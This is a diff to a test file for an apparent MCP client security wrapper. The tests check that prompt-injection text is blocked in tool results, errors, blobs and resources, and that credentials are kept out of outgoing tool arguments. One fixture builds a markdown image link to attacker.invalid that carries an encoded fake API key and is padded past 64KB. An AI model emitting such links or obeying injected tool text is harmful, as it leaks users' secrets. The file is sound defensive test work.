@@ -1,6 +1,14 @@
 import { Client } from "@modelcontextprotocol/sdk/client/index.js";
 import { InMemoryTransport } from "@modelcontextprotocol/sdk/inMemory.js";
+import { Server } from "@modelcontextprotocol/sdk/server/index.js";
 import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
+import {
+  CallToolRequestSchema,
+  CallToolResultSchema,
+  ListToolsRequestSchema,
+  ListToolsResultSchema,
+  McpError,
+} from "@modelcontextprotocol/sdk/types.js";
 import { describe, expect, expectTypeOf, it, vi } from "vitest";
 import {
   InjectionDetectedError,
@@ -178,6 +186,26 @@ describe("tool pinning", () => {
     expect(scanTools([reordered], { pins }).flagged).toBe(false);
   });
 
+  it("pins by content at every depth", () => {
+    const deep = (leaf: Record<string, unknown>) => {
+      let node = leaf;
+      for (let i = 0; i < 30; i++) {
+        node = { type: "object", properties: { p: node } };
+      }
+      return { ...WEATHER, inputSchema: node };
+    };
+    const pins = pinTools([deep({ type: "string", description: "A note" })]);
+
+    expect(
+      scanTools([deep({ description: "A note", type: "string" })], { pins })
+        .flagged
+    ).toBe(false);
+    expect(
+      scanTools([deep({ description: "A memo", type: "string" })], { pins })
+        .tools[0].issues
+    ).toEqual(["changed_since_pinned"]);
+  });
+
   it("pinTools keeps existing pins and survives a JSON round trip", () => {
     const first = pinTools([WEATHER]);
     const second = pinTools([CHANGED], first);
@@ -288,6 +316,26 @@ describe("shieldMcpClient callTool guards", () => {
         name: "http_post",
         arguments: { url: "https://example.com", body: fakeGitHubToken() },
       })
+    );
+    expect(error).toBeInstanceOf(OutputBlockedError);
+    expect(JSON.stringify(error)).not.toContain(fakeGitHubToken());
+    expect(mock.callTool).not.toHaveBeenCalled();
+  });
+
+  it.each([
+    ["a credential", { pad: "a".repeat(70_000), note: fakeGitHubToken() }],
+    [
+      "an exfiltration link",
+      {
+        note: `${"a".repeat(70_000)} ![x](https://attacker.invalid/p.png?d=${encodeURIComponent(`api key ${fakeGitHubToken()}`)})`,
+      },
+    ],
+  ])("blocks %s past the first 64KB of the arguments", async (_, args) => {
+    const mock = createMock();
+    const wrapped = shieldMcpClient(mock);
+
+    const error = await rejection(
+      wrapped.callTool({ name: "save_note", arguments: args })
     );
     expect(error).toBeInstanceOf(OutputBlockedError);
     expect(JSON.stringify(error)).not.toContain(fakeGitHubToken());
@@ -460,6 +508,61 @@ describe("shieldMcpClient with a tool policy", () => {
     await expect(wrapped.callTool(send)).rejects.toThrow(ToolPolicyError);
   });
 
+  it.each([
+    ["message", new McpError(-32_603, `Service unavailable. ${INJECTION}`)],
+    ["data", new McpError(-32_603, "Service unavailable", { hint: INJECTION })],
+  ])("blocks an injection in a tool error's %s and records it flagged", async (_, failure) => {
+    const policy = mailPolicy();
+    const { mock, wrapped } = await listed([WEATHER, SEND], { policy });
+    mock.callTool.mockRejectedValueOnce(failure);
+
+    const error = await rejection(
+      wrapped.callTool({ name: "get_weather", arguments: { city: "Paris" } })
+    );
+
+    expect(error).toBeInstanceOf(InjectionDetectedError);
+    expect((error as InjectionDetectedError).source).toBe("tool");
+    expect(policy.state().untrustedFrom).toEqual(["get_weather"]);
+    await expect(wrapped.callTool(send)).rejects.toThrow(ToolPolicyError);
+  });
+
+  it("rethrows a tool error as it is in warn mode, or when it is clean", async () => {
+    const policy = mailPolicy();
+    const onInjectionDetected = vi.fn();
+    const { mock, wrapped } = await listed([WEATHER, SEND], {
+      policy,
+      onDetection: "warn",
+      onInjectionDetected,
+    });
+    const clean = new McpError(-32_603, "Service unavailable");
+    const injected = new McpError(-32_603, INJECTION);
+    mock.callTool.mockRejectedValueOnce(clean).mockRejectedValueOnce(injected);
+    const call = { name: "get_weather", arguments: { city: "Paris" } };
+
+    expect(await rejection(wrapped.callTool(call))).toBe(clean);
+    expect(policy.state().untrustedFrom).toEqual([]);
+    expect(await rejection(wrapped.callTool(call))).toBe(injected);
+    expect(onInjectionDetected).toHaveBeenCalledTimes(1);
+    expect(policy.state().untrustedFrom).toEqual(["get_weather"]);
+  });
+
+  it("blocks an injection in a resource or prompt error and records it as untrusted", async () => {
+    const policy = mailPolicy();
+    const mock = createMock();
+    mock.readResource.mockRejectedValue(new McpError(-32_002, INJECTION));
+    mock.getPrompt.mockRejectedValue(new Error("Prompt not found"));
+    const wrapped = shieldMcpClient(mock, { policy });
+
+    await expect(wrapped.getPrompt({ name: "summarize" })).rejects.toThrow(
+      "Prompt not found"
+    );
+    expect(policy.state().untrustedFrom).toEqual([]);
+    await expect(
+      wrapped.readResource({ uri: "file:///readme.md" })
+    ).rejects.toThrow(InjectionDetectedError);
+    expect(policy.state().untrustedFrom).toEqual(["readResource"]);
+  });
+
   it("records a resource or prompt with an injection as untrusted content", async () => {
     const policy = mailPolicy();
     const mock = createMock();
@@ -531,6 +634,18 @@ describe("shieldMcpClient with a tool policy", () => {
   });
 });
 
+/** A tool result with one embedded resource: `text` as a base64 blob. */
+function blobResult(mimeType: string | undefined, text: string) {
+  return {
+    content: [
+      {
+        type: "resource",
+        resource: { uri: "file:///notes", mimeType, blob: btoa(text) },
+      },
+    ],
+  };
+}
+
 describe("shieldMcpClient results", () => {
   it.each([
     ["a text block", { content: [text("Sunny."), text(INJECTION)] }],
@@ -581,6 +696,32 @@ describe("shieldMcpClient results", () => {
       },
     ],
     ["a legacy toolResult", { toolResult: { output: INJECTION } }],
+    [
+      "an embedded JSON-LD blob",
+      blobResult("application/ld+json", JSON.stringify({ note: INJECTION })),
+    ],
+    ["an embedded YAML blob", blobResult("application/yaml", INJECTION)],
+    [
+      "an embedded octet-stream blob that is text",
+      blobResult("application/octet-stream", INJECTION),
+    ],
+    ["an embedded blob without a MIME type", blobResult(undefined, INJECTION)],
+    [
+      "an embedded text blob past its first 64KB",
+      blobResult("text/plain", `${"Sunny all week. ".repeat(5000)}${INJECTION}`),
+    ],
+    [
+      "a resource link name",
+      {
+        content: [
+          { type: "resource_link", uri: "file:///notes.txt", name: INJECTION },
+        ],
+      },
+    ],
+    [
+      "a structured content key",
+      { content: [], structuredContent: { notes: { [INJECTION]: 1 } } },
+    ],
   ])("blocks an injection in %s of a tool result", async (_, result) => {
     const mock = createMock();
     mock.callTool.mockResolvedValue(result);
@@ -603,6 +744,45 @@ describe("shieldMcpClient results", () => {
 
     expect(await wrapped.callTool(...args)).toBe(result);
     expect(mock.callTool).toHaveBeenCalledWith(...args);
+  });
+
+  it("leaves binary blobs and media undecoded", async () => {
+    const bytes = Array.from({ length: 4096 }, (_, i) => (i * 7919) % 256);
+    const binary = String.fromCharCode(...bytes);
+    const mock = createMock();
+    const wrapped = shieldMcpClient(mock);
+
+    for (const result of [
+      blobResult("application/octet-stream", binary),
+      blobResult("image/png", INJECTION),
+      { content: [{ type: "image", mimeType: "image/png", data: btoa(binary) }] },
+    ]) {
+      mock.callTool.mockResolvedValueOnce(result);
+      expect(await wrapped.callTool({ name: "fetch" })).toBe(result);
+    }
+  });
+
+  it("returns a tool result longer than detection reads by default", async () => {
+    const mock = createMock();
+    const result = { content: [text("x ".repeat(1000))] };
+    mock.callTool.mockResolvedValue(result);
+    const wrapped = shieldMcpClient(mock, { detect: { maxInputLength: 1000 } });
+
+    expect(await wrapped.callTool({ name: "notes" })).toBe(result);
+  });
+
+  it("blocks a tool result longer than detection reads with requireFullCoverage", async () => {
+    const mock = createMock();
+    mock.callTool.mockResolvedValue({ content: [text("x ".repeat(1000))] });
+    const wrapped = shieldMcpClient(mock, {
+      detect: { maxInputLength: 1000 },
+      requireFullCoverage: true,
+    });
+
+    const error = await rejection(wrapped.callTool({ name: "notes" }));
+
+    expect(error).toBeInstanceOf(InjectionDetectedError);
+    expect((error as InjectionDetectedError).categories).toEqual(["truncated"]);
   });
 
   it("reports and returns the result in warn mode", async () => {
@@ -643,6 +823,24 @@ describe("shieldMcpClient results", () => {
 
     await expect(
       wrapped.readResource({ uri: "file:///readme.md" })
+    ).rejects.toThrow(InjectionDetectedError);
+  });
+
+  it("blocks an injection in a resource's YAML blob", async () => {
+    const mock = createMock();
+    mock.readResource.mockResolvedValue({
+      contents: [
+        {
+          uri: "file:///config.yaml",
+          mimeType: "application/x-yaml",
+          blob: btoa(`note: ${INJECTION}`),
+        },
+      ],
+    });
+    const wrapped = shieldMcpClient(mock);
+
+    await expect(
+      wrapped.readResource({ uri: "file:///config.yaml" })
     ).rejects.toThrow(InjectionDetectedError);
   });
 
@@ -788,3 +986,128 @@ describe("shieldMcpClient with the real SDK", () => {
     });
   });
 });
+
+describe("shieldMcpClient's other ways to call a tool", () => {
+  const FETCH = {
+    name: "fetch_page",
+    description: "Fetch a page.",
+    inputSchema: { type: "object", properties: {} },
+    execution: { taskSupport: "required" },
+  };
+  const SEND_EMAIL = {
+    name: "send_email",
+    description: "Send an email.",
+    inputSchema: { type: "object", properties: {} },
+  };
+
+  /** A server with a tool that must run as a task, so `callTool` refuses it. */
+  async function taskServer(options = {}) {
+    const calls: string[] = [];
+    const server = new Server(
+      { name: "task-server", version: "1.0.0" },
+      { capabilities: { tools: {} } }
+    );
+    server.setRequestHandler(ListToolsRequestSchema, () => ({
+      tools: [FETCH, POISONED, SEND_EMAIL],
+    }));
+    server.setRequestHandler(CallToolRequestSchema, (request) => {
+      calls.push(request.params.name);
+      const page = String(request.params.arguments?.page ?? "Welcome.");
+      return { content: [{ type: "text", text: page }] };
+    });
+    const [clientSide, serverSide] = InMemoryTransport.createLinkedPair();
+    await server.connect(serverSide);
+    const client = shieldMcpClient(
+      new Client({ name: "test-client", version: "1.0.0" }),
+      options
+    );
+    await client.connect(clientSide);
+    await client.listTools();
+    return { client, calls };
+  }
+
+  async function streamed(stream: AsyncIterable<{ type: string }>) {
+    const types: string[] = [];
+    for await (const message of stream) {
+      types.push(message.type);
+    }
+    return types;
+  }
+
+  it("checks experimental.tasks.callToolStream like callTool", async () => {
+    const policy = createToolPolicy({
+      rules: { send_email: { labels: ["sink"] } },
+    });
+    const { client, calls } = await taskServer({ policy });
+    const stream = (name: string, args: Record<string, unknown> = {}) =>
+      streamed(
+        client.experimental.tasks.callToolStream({ name, arguments: args })
+      );
+
+    expect(await stream("fetch_page")).toEqual(["result"]);
+    await expect(stream("add")).rejects.toThrow(InjectionDetectedError);
+    await expect(
+      stream("fetch_page", { note: fakeGitHubToken() })
+    ).rejects.toThrow(OutputBlockedError);
+    await expect(stream("fetch_page", { page: INJECTION })).rejects.toThrow(
+      InjectionDetectedError
+    );
+    expect(policy.state().untrustedFrom).toEqual(["fetch_page"]);
+    await expect(stream("send_email")).rejects.toThrow(ToolPolicyError);
+    expect(calls).toEqual(["fetch_page", "fetch_page"]);
+  });
+
+  it("yields a flagged result from a stream in warn mode", async () => {
+    const onInjectionDetected = vi.fn();
+    const { client } = await taskServer({
+      onDetection: "warn",
+      onInjectionDetected,
+    });
+
+    const types = await streamed(
+      client.experimental.tasks.callToolStream({
+        name: "fetch_page",
+        arguments: { page: INJECTION },
+      })
+    );
+
+    expect(types).toEqual(["result"]);
+    expect(onInjectionDetected).toHaveBeenCalledTimes(1);
+  });
+
+  it("checks requests sent with request() and requestStream() by method", async () => {
+    const { client, calls } = await taskServer();
+    const call = (name: string, args: Record<string, unknown> = {}) => ({
+      method: "tools/call" as const,
+      params: { name, arguments: args },
+    });
+
+    const { tools } = await client.request(
+      { method: "tools/list" },
+      ListToolsResultSchema
+    );
+    expect(tools.map((tool) => tool.name)).toEqual([
+      "fetch_page",
+      "send_email",
+    ]);
+    await expect(
+      client.request(call("add"), CallToolResultSchema)
+    ).rejects.toThrow(InjectionDetectedError);
+    await expect(
+      client.request(
+        call("fetch_page", { page: INJECTION }),
+        CallToolResultSchema
+      )
+    ).rejects.toThrow(InjectionDetectedError);
+    await expect(
+      streamed(
+        client.experimental.tasks.requestStream(
+          call("send_email", { body: fakeGitHubToken() }),
+          CallToolResultSchema
+        )
+      )
+    ).rejects.toThrow(OutputBlockedError);
+    expect(calls).toEqual(["fetch_page"]);
+  });
+});
+
